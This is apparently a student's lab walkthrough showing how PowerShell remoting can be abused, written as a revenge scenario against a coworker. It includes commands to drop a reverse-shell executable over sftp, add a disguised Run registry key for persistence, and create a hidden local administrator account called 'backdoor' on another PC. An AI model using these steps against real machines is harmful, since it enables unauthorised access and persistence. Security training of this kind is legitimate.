## Introduction

We have a hands-on lab in university where we played around powershell commands. 
I modified our lab activity which revolves in powershell cmdlets command and clie then tried creating a real world scenario which you can utilize powershell as a tool for hacking.

Hope you enjoy my Walkthrough! 

### Context

You have an officemate named Tyronne whose account was recently been reset by the IT administrator.

IT team sometimes fail to follow proper security practices. They just leave sticky notes with new login credentials on employees’ desks for them to reset their passwords.

Tyronne’s primary responsibility involves remotely accessing the PC of another user referred to as “Victim”, where he executes commands via remote sessions.

You really hate this kid, before tyronne can change his password you need to find a way to create a backdoor user at victim's account.

NOTE: 

tyronne's environment was already modified:
* Windows Defender is off 
* Executing unsigned powershell commands was already allowed. 
* Don't become tyronne 

## Vector of Attack

![[/z.attachments/Pasted image 20250611172051.png]]

## Foothold


![[../z.attachments/Pasted image 20250611164942.png]]

Testing foothold
```
ssh tyronne@ip
```

## Creating persistence

* Need to create persistence to always have access to this machine anytime of the day even if he changed password (only useless if machine is off)

Create reverse shell
```
msfvenom create .exe
```

Insert Payload
```
sftp tyronne@192.168.1.100 <<< $'put file.exe
```

Create startup command
```
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsHelper /d "%USERPROFILE%\reverseshell.exe /f
```

reboot and launch metasploit


## Commands to run

```
$cred = Import-Clixml "$env:USERPROFILE\remote_cred.xml"

$session1 = New-PSsession -ComputerName 172.16.69.129 -Authentication Negotiate -Credential $cred

```


Test if you can get the user info of Victim
```
Invoke-Command -Session $session1 -ScriptBlock {Get-ComputerInfo|Select-Object csprimaryownername,
csdnshostname, Windowsbuildlabex}
```

Technically the .xml file password is encoded it is much easier to create a new user than decoding it in hashcat/jtr depends on the complexity of the password. 


New command
```
Invoke-Command -Session $session1 -ScriptBlock {New-LocalUser -Name "backdoor" -Password (ConvertTo-SecureString 'testing123' -AsPlainText -Force) -FullName "pwned" -Description "pwned by zaakceptowac" Add-LocalGroupMember -Group "Administrators" -Member "backdoor"}
```


Try if you can rdp to this machine using your credentials

## Main takeways

* Powershell is powerful
* Pivoting is easy when you already have credentials
* Always practice good security hygiene (internal/external)
